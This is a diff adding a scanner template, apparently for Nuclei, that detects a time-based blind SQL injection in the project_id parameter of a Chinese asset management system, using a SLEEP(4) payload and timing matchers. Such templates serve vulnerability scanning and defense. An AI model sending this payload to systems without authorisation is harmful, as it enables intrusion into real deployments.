@@ -1,0 +1,44 @@
+id: baiyiyun-select-sqli
+
+info:
+  name: 百易云资产管理运营系统select存在SQL注入漏洞
+  author: baiyiyun
+  severity: high
+  tags: baiyiyun
+
+http:
+  - raw:
+      - |+
+        GET /wuser/admin.ima.select.php?project_id=1 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
+        Accept: */*
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+
+      - |+
+        GET /wuser/admin.ima.select.php?project_id=1%20AND%20(SELECT%206941%20FROM%20(SELECT(SLEEP(4)))OKTO) HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
+        Accept: */*
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - 'duration_2 >= 4'
+          - 'duration_1 < 2'
+          - 'duration_2 < 10'
+        condition: and
+      - type: word
+        part: body
+        words:
+          - '仪表抄录'
+        condition: and
+
